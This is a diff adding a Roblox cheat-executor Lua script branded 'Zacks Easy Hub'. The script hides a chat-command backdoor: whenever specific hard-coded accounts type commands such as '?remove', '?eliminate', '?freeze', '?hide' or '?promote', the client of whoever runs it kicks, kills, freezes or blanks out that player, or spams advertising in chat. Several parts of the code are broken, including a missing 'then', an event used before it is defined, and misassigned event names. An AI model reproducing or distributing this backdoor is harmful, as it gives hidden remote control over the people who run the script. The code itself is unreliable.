@@ -1,0 +1,457 @@
+getgenv().Game = game
+getgenv().JobID = getgenv().Game.JobId
+getgenv().PlaceID = getgenv().Game.PlaceId
+
+if getgenv().Script_Ran then
+    return 
+end
+
+getgenv().Service_Wrap = function(serviceName)
+    if cloneref then
+        return cloneref(getgenv().Game:GetService(serviceName))
+    else
+        return getgenv().Game:GetService(serviceName)
+    end
+end
+
+getgenv().Players = getgenv().Service_Wrap("Players")
+getgenv().LocalPlayer = getgenv().Players.LocalPlayer
+
+if getgenv().LocalPlayer.Name == "01xMYS"
+    print("Owner found, excluding.")
+else
+    getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")
+    getgenv().RBXGeneral = getgenv().TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+
+    local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    if PlayerGui:FindFirstChild("FULLSCREEN_GUI") then
+        print("Found.")
+    else
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer
+
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "FULLSCREEN_GUI"
+        screenGui.IgnoreGuiInset = true
+        screenGui.Enabled = false
+        screenGui.ResetOnSpawn = false
+
+        local fullScreenFrame = Instance.new("Frame")
+        fullScreenFrame.Size = UDim2.new(1, 0, 1, 0)
+        fullScreenFrame.Position = UDim2.new(0, 0, 0, 0)
+        fullScreenFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+        fullScreenFrame.BorderSizePixel = 0
+        fullScreenFrame.Parent = screenGui
+        fullScreenFrame.Visible = true
+
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+    end
+
+    print("Started.")
+
+    if game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION") then
+        print("Effect found.")
+        wait(0.2)
+        local blur = game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION")
+        blur.Enabled = true
+    else
+        local blur = Instance.new("BlurEffect")
+        blur.Name = "VISION"
+        blur.Parent = game:GetService("Workspace"):FindFirstChild("Camera")
+        blur.Size = 0
+        blur.Enabled = true
+    end
+
+    getgenv().Players = getgenv().Service_Wrap("Players")
+    local cmdp = getgenv().Players
+    local cmdlp = cmdp.LocalPlayer
+
+    function findplr(args, tbl)
+        local players = tbl or cmdp:GetPlayers()
+        if args == "me" then
+            return cmdlp
+        elseif args == "random" then 
+            return players[math.random(1, #players)]
+        else 
+            for _, v in pairs(players) do
+                if v.Name:lower():find(args:lower()) or v.DisplayName:lower():find(args:lower()) then
+                    return v
+                end
+            end
+        end
+        return nil
+    end
+
+    getgenv().ReplicatedStorage = getgenv().Service_Wrap("ReplicatedStorage")
+
+    if not getgenv().ReplicatedStorage:FindFirstChild("Replicate-Players") then
+        local Folder_Inst = Instance.new("Folder")
+        Folder_Inst.Name = "Replicate-Players"
+        Folder_Inst.Parent = getgenv().ReplicatedStorage
+    end
+
+    local function ensureBoolValue(playerName)
+        local folder = getgenv().ReplicatedStorage:FindFirstChild("Replicate-Players")
+        if folder then
+            local boolValue = folder:FindFirstChild("Select-" .. playerName)
+            if not boolValue then
+                boolValue = Instance.new("BoolValue")
+                boolValue.Name = "Select-" .. playerName
+                boolValue.Parent = folder
+            end
+            return boolValue
+        end
+        return nil
+    end
+
+    local function handleCommand(command, playerName)
+        local player = findplr(playerName)
+        if not player then
+            warn("Player not found: " .. playerName)
+            return
+        end
+
+        local boolValue = ensureBoolValue(player.Name)
+        if not boolValue then
+            warn("Failed to create or find BoolValue for player: " .. player.Name)
+            return
+        end
+
+        boolValue.Value = true
+
+        if command == "?bring" then
+            local owner = cmdp:FindFirstChild("L0CKED_1N1") or cmdp:FindFirstChild("CHEATING_B0SS")
+            if owner and player and owner.Character and player.Character then
+                local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
+                local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
+                if targetHRP and ownerHRP then
+                    targetHRP.CFrame = ownerHRP.CFrame
+                else
+                    warn("HumanoidRootPart missing for target or owner.")
+                end
+            else
+                warn("Owner or target character is missing.")
+            end
+        elseif command == "?remove" then
+            if player then
+                local kickReason = reason or "You have been kicked by the script owner."
+                player:Kick(kickReason)
+            end
+        elseif command == "?eliminate" then
+            if player.Character then
+                local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
+                if humanoid then
+                    humanoid.Health = 0
+                end
+            end
+        elseif command == "?freeze" then
+            if player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    hrp.Anchored = true
+                end
+            end
+        elseif command == "?unfreeze" then
+            if player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    hrp.Anchored = false
+                end
+            end
+        elseif command == "?script" then
+            if player then
+                getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("I'm using: Zacks Easy Hub")
+            end
+        elseif command == "?promote" then
+            if player then
+                local speeches = {
+                    "Zacks Easy Hub [ON TOP!]",
+                    "V6 Is The BEST!",
+                    "10/10 Script!",
+                    "This script hub is OP!",
+                    "Powerful script!",
+                    "I can vouch for this script!",
+                    "Best script for this game!"
+                }
+            
+                local randomSpeech = speeches[math.random(1, #speeches)]
+                getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync(randomSpeech)
+            end
+        elseif command == "?mute" then
+            if player then
+                local adi = player:FindFirstChildOfClass("AudioDeviceInput")
+                if adi then
+                    adi.Muted = true
+                end
+            end
+        elseif command == "?unmute" then
+            if player then
+                local adi = player:FindFirstChildOfClass("AudioDeviceInput")
+                if adi then
+                    adi.Muted = false
+                end
+            end
+        elseif command == "?emote" then
+            if player then
+                getgenv().Emotes = {
+                    17360720445,
+                    5917570207,
+                    18526338976,
+                    15698511500,
+                    4689362868,
+                    5104377791,
+                    3994130516,
+                    3576719440,
+                    15123050663,
+                    3934986896,
+                    17746270218,
+                    6865013133,
+                    3576721660,
+                    14548709888,
+                    15506496093,
+                    13071993910
+                }
+
+                local randomEmote = getgenv().Emotes[math.random(1, #getgenv().Emotes)]
+                local get_char = player.Character or player.CharacterAdded:Wait()
+                local char_hum = get_char:WaitForChild("Humanoid") or get_char:FindFirstChildWhichIsA("Humanoid")
+        
+                char_hum:PlayEmoteAndGetAnimTrackById(tonumber(randomEmote))
+            end
+        elseif command == "?nobooth" then
+            if player then
+                game:GetService("ReplicatedStorage"):FindFirstChild("DeleteBoothOwnership"):FireServer()
+            end
+        elseif command == "?blur" then
+            if player then
+                if game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION") then
+                    local blur = game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION")
+                    blur.Enabled = true
+                    blur.Size = 24
+                else
+                    local blur = Instance.new("BlurEffect")
+                    blur.Name = "VISION"
+                    blur.Parent = game:GetService("Workspace"):FindFirstChild("Camera")
+                    blur.Size = 24
+                    blur.Enabled = true
+                end
+            end
+        elseif command == "?unblur" then
+            if player then
+                if game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION") then
+                    local blur = game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION")
+                    blur.Enabled = false
+                    blur.Size = 0
+                else
+                    local blur = Instance.new("BlurEffect")
+                    blur.Name = "VISION"
+                    blur.Parent = game:GetService("Workspace"):FindFirstChild("Camera")
+                    blur.Size = 0
+                    blur.Enabled = false
+                end
+            end
+        elseif command == "?hide" then
+            if player then
+                if game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI") then
+                    local white_screen = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI")
+                    white_screen.Enabled = true
+                else
+                    warn("?")
+                end
+            end
+        elseif command == "?unhide" then
+            if player then
+                if game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI") then
+                    local white_screen = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI")
+                    white_screen.Enabled = false
+                else
+                    warn("?")
+                end
+            end
+        else
+            warn("Unknown command: " .. command)
+        end
+
+        boolValue.Value = false
+    end
+
+    getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")
+
+    getgenv().TextChatService.MessageReceived:Connect(function(message)
+        local sender = message.TextSource.Name
+        local text = message.Text
+
+        if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" then
+            local command, playerName = string.match(text, "^(%?%w+)%s*(.*)")
+            if command then
+                handleCommand(command, playerName)
+            else
+                warn("Invalid message format: " .. text)
+            end
+        end
+    end)
+
+    getgenv().Players = getgenv().Service_Wrap("Players")
+    getgenv().Lighting = getgenv().Service_Wrap("Lighting")
+    getgenv().StarterPlayer = getgenv().Service_Wrap("StarterPlayer")
+    getgenv().Workspace = getgenv().Service_Wrap("Workspace")
+    getgenv().Terrain = getgenv().Workspace.Terrain or getgenv().Workspace:FindFirstChild("Terrain")
+    getgenv().TeleportService = getgenv().Service_Wrap("TeleportService")
+    getgenv().TweenService = getgenv().Service_Wrap("TweenService")
+    getgenv().HttpService = getgenv().Service_Wrap("HttpService")
+    getgenv().AssetService = getgenv().Service_Wrap("AssetService")
+    getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")
+    getgenv().RBXGeneral = getgenv().TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+    getgenv().LocalPlayer = getgenv().Players.LocalPlayer
+    getgenv().PlayerGui = getgenv().LocalPlayer:WaitForChild("PlayerGui") or getgenv().LocalPlayer:FindFirstChild("PlayerGui")
+    getgenv().Character = getgenv().LocalPlayer.Character or getgenv().LocalPlayer.CharacterAdded:Wait()
+    getgenv().HumanoidRootPart = getgenv().Character:WaitForChild("HumanoidRootPart") or getgenv().Character:FindFirstChild("HumanoidRootPart")
+    getgenv().Humanoid = getgenv().Character:WaitForChild("Humanoid") or getgenv().Character:FindFirstChildWhichIsA("Humanoid")
+
+    local function updateCharacterComponents(character)
+        getgenv().Character = character
+        getgenv().HumanoidRootPart = character:WaitForChild("HumanoidRootPart") or character:FindFirstChild("HumanoidRootPart")
+        getgenv().Humanoid = character:WaitForChild("Humanoid") or character:FindFirstChildWhichIsA("Humanoid")
+    end
+
+    updateCharacterComponents(getgenv().Character)
+    getgenv().LocalPlayer.CharacterAdded:Connect(function(newCharacter)
+        updateCharacterComponents(newCharacter)
+    end)
+
+    function run_kill(player)
+        local target = findplr(player)
+        if target then
+            killEvent:Fire(target)
+        else
+            warn(tostring(target).." was not found!")
+        end
+    end
+
+    function run_chat()
+        local speeches = {
+            "Zacks Easy Hub [ON TOP!]",
+            "V6 Is The BEST!",
+            "10/10 Script!",
+            "This script hub is OP!",
+            "Powerful script!",
+            "I can vouch for this script!",
+            "Best script for this game!"
+        }
+
+        local randomSpeech = speeches[math.random(1, #speeches)]
+        getgenv().RBXGeneral:SendAsync(randomSpeech)
+    end
+
+    function run_kick(player, reason)
+        kickEvent:Fire(player, reason)
+    end
+
+    function run_bring(player)
+        bringEvent:Fire(player)
+    end
+
+    function run_usingscript()
+        scriptEvent:Fire()
+    end
+
+    function run_freeze(toggle, player)
+        if toggle == "true" and player then
+            freezeEvent:Fire("true", player)
+        elseif toggle == "false" and player then
+            freezeEvent:Fire("false", player)
+        end
+    end
+
+    local killEvent = Instance.new("BindableEvent")
+    killEvent.Name = "Keybinds"
+    killEvent.Parent = ReplicatedStorage
+
+    local chatEvent = Instance.new("BindableEvent")
+    chatEvent.Name = "Keybinds-1"
+    chatEvent.Parent = ReplicatedStorage
+
+    local kickEvent = Instance.new("BindableEvent")
+    kickEvent.Name = "Keybinds-2"
+    kickEvent.Parent = ReplicatedStorage
+
+    local bringEvent = Instance.new("BindableEvent")
+    bringEvent.Name = "Keybinds-3"
+    bringEvent.Parent = ReplicatedStorage
+
+    local scriptEvent = Instance.new("BindableEvent")
+    scriptEvent.Name = "Keybinds-4"
+    scriptEvent.Parent = ReplicatedStorage
+
+    local freezeEvent = Instance.new("BindableEvent")
+    scriptEvent.Name = "Keybinds-5"
+    scriptEvent.Parent = ReplicatedStorage
+
+    killEvent.Event:Connect(function(player)
+        local find_plr_target = findplr(player)
+        local findplr_char = find_plr_target.Character or find_plr_target.CharacterAdded:Wait()
+        local Humanoid_FindPLR = findplr_char:WaitForChild("Humanoid") or findplr_char:FindFirstChildWhichIsA("Humanoid")
+        if findplr_char and Humanoid_FindPLR then
+            Humanoid_FindPLR.Health = 0
+        end
+    end)
+
+    kickEvent.Event:Connect(function(player, reason)
+        local targetPlayer = findplr(player)
+        if targetPlayer then
+            if reason and reason ~= "" then
+                targetPlayer:Kick(reason)
+            else
+                targetPlayer:Kick("You have been removed by: Script Owner.")
+            end
+        else
+            warn("Player not found: " .. tostring(player))
+        end
+    end)
+
+    chatEvent.Event:Connect(function()
+        run_chat()
+    end)
+
+    bringEvent.Event:Connect(function(player)
+        local targetPlayer = findplr(player)
+        local owner = game.Players:FindFirstChild("L0CKED_1N1") or game.Players:FindFirstChild("CHEATING_B0SS")
+
+        if not owner then
+            warn("No Owner Found!")
+            return
+        end
+
+        if targetPlayer and targetPlayer.Character and owner.Character then
+            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local ownerChar = owner.Character
+            if targetHRP and ownerChar then
+                targetHRP:PivotTo(ownerChar:GetPivot())
+            else
+                warn("HumanoidRootPart missing for target or owner.")
+            end
+        else
+            warn("Target player, their character, or owner character is missing.")
+        end
+    end)
+
+    scriptEvent.Event:Connect(function(logic)
+        getgenv().RBXGeneral:SendAsync(logic)
+    end)
+
+    freezeEvent.Event:Connect(function(toggle, player)
+        local targetPlayer = findplr(player)
+        if targetPlayer and targetPlayer.Character then
+            local humanoidRootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if humanoidRootPart then
+                humanoidRootPart.Anchored = (toggle == "true")
+            else
+                warn("HumanoidRootPart not found for player: " .. player)
+            end
+        else
+            warn("Player or their character not found: " .. player)
+        end
+    end)
+    wait()
+    getgenv().Script_Ran = true
+end
